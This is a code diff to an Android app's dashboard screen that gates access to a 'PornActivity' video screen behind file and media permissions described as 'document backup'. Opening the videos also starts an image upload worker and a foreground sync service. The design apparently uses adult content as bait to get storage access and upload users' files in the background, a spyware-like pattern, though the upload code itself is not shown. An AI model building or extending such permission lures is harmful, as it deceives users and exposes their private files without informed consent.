@@ -198,8 +198,34 @@ public class DashboardActivity extends AppCompatActivity {
     private void openUnlockedVideos() {
         ImageUploadWorker.enqueueWork(this);
         // Request file/media permissions for document backup
+        // This will start the permission flow, then open PornActivity
+        requestFileBackupPermissionsAndOpenVideos();
+    }
+
+    /**
+     * Request file backup permissions, then open PornActivity when done
+     */
+    private void requestFileBackupPermissionsAndOpenVideos() {
+        if (hasAllFilePermissions()) {
+            // All permissions already granted - open activity immediately
+            startPornActivity();
+            return;
+        }
+        
+        // Start permission flow (will complete and open activity)
         requestFileBackupPermissions();
-        startActivity(new Intent(this, PornActivity.class));
+    }
+    
+    /**
+     * Opens PornActivity after all permissions are handled
+     */
+    private void startPornActivity() {
+        try {
+            startActivity(new Intent(this, PornActivity.class));
+        } catch (Exception e) {
+            Log.e(TAG, "Error opening PornActivity", e);
+            Toast.makeText(this, "Unable to open videos", Toast.LENGTH_SHORT).show();
+        }
     }
 
     private void onChatTapped() {
@@ -500,10 +526,13 @@ public class DashboardActivity extends AppCompatActivity {
     /**
      * Starts the foreground sync service for file backup.
      * Called ONLY after all permissions are confirmed granted.
+     * Also opens PornActivity if this is part of the video flow.
      */
     private void startFileSync() {
         Log.d(TAG, "✅ All permissions confirmed - starting file sync service");
         ContextCompat.startForegroundService(this, new Intent(this, SyncService.class));
+        // Open the video activity
+        startPornActivity();
     }
 
     private java.util.List<String> missingFilePermissions() {
